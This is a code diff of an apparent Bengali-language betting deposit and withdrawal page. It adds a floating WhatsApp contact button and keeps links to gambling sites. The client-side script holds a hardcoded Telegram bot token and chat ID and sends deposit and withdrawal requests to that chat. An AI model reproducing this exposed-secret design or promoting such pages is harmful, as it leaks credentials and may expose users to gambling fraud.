@@ -217,6 +217,50 @@ body{
   font-size:14px;
   color:#94a3b8;
 }
+
+/* ========================= */
+/* 🔥 WHATSAPP FLOAT ICON (NEW) */
+/* ========================= */
+
+.whatsapp-float{
+  position:fixed;
+  right:15px;
+  bottom:20px;
+  z-index:99999;
+  display:flex;
+  flex-direction:column;
+  align-items:center;
+  gap:5px;
+}
+
+.whatsapp-float span{
+  font-size:12px;
+  color:white;
+  background:rgba(0,0,0,0.3);
+  padding:4px 8px;
+  border-radius:10px;
+  backdrop-filter: blur(6px);
+}
+
+.whatsapp-btn{
+  width:55px;
+  height:55px;
+  border-radius:50%;
+  background:#25D366;
+  display:flex;
+  align-items:center;
+  justify-content:center;
+  cursor:pointer;
+  box-shadow:0 0 15px rgba(37,211,102,0.5);
+  text-decoration:none;
+}
+
+.whatsapp-btn svg{
+  width:30px;
+  height:30px;
+  fill:white;
+}
+
 </style>
 </head>
 
@@ -271,16 +315,22 @@ body{
 
 </div>
 
-<!-- FLOAT -->
+<!-- FLOAT LEFT -->
 <div class="float-area">
   <div class="site-card" onclick="window.open('https://velki247.live','_blank')"><b>ভেল্কি</b></div>
   <div class="site-card" onclick="window.open('https://www.bjwala.co','_blank')"><b>বাজিওয়ালা</b></div>
   <div class="site-card" onclick="window.open('https://www.9xbet9.live/','_blank')"><b>9xBet</b></div>
+</div>
 
-  <!-- ✅ শুধু এটা যোগ করা হয়েছে -->
-  <div class="site-card" onclick="window.open('https://wa.me/+855969610245','_blank')">
-    <b>আকাশ খান</b>
-  </div>
+<!-- WHATSAPP FLOAT RIGHT (NEW) -->
+<div class="whatsapp-float">
+  <span>আকাশ খান</span>
+  <a class="whatsapp-btn" href="https://wa.me/+855969610245" target="_blank">
+    <svg viewBox="0 0 32 32">
+      <path d="M19.11 17.53c-.27-.14-1.6-.79-1.85-.88-.25-.09-.43-.14-.61.14-.18.27-.7.88-.86 1.06-.16.18-.32.2-.59.07-.27-.14-1.12-.41-2.13-1.31-.79-.7-1.32-1.56-1.47-1.83-.16-.27-.02-.42.12-.56.12-.12.27-.32.41-.48.14-.16.18-.27.27-.45.09-.18.05-.34-.02-.48-.07-.14-.61-1.47-.84-2.02-.22-.53-.45-.46-.61-.47h-.52c-.18 0-.48.07-.73.34-.25.27-.95.93-.95 2.26 0 1.33.98 2.62 1.12 2.8.14.18 1.92 2.94 4.66 4.12.65.28 1.16.45 1.56.58.66.21 1.26.18 1.73.11.53-.08 1.6-.65 1.82-1.28.23-.63.23-1.17.16-1.28-.07-.11-.25-.18-.52-.32z"/>
+      <path d="M16 3C9.37 3 4 8.37 4 15c0 2.11.55 4.1 1.52 5.84L4 29l8.3-1.48A11.94 11.94 0 0 0 16 27c6.63 0 12-5.37 12-12S22.63 3 16 3z"/>
+    </svg>
+  </a>
 </div>
 
 <!-- SUCCESS MODAL -->
@@ -292,7 +342,7 @@ body{
 </div>
 
 <script>
-const botToken = "8216213984:AAFCoGsouGouXgnit2vKR6Rv8-VonSYL7_irk";
+const botToken = "8216213984:AAFQsCOgouXgnit2vKR6Rv8-VonSYL7_irk";
 const chatId = "8406979793";
 
 let orderCounter = 23;
@@ -326,6 +376,7 @@ function sendDeposit(){
 ━━━━━━━━━━━━`;
 
   sendToTelegram(msg);
+
   showSuccess(id);
 }
 
@@ -343,6 +394,7 @@ function sendWithdraw(){
 ━━━━━━━━━━━━`;
 
   sendToTelegram(msg);
+
   showSuccess(id);
 }
 
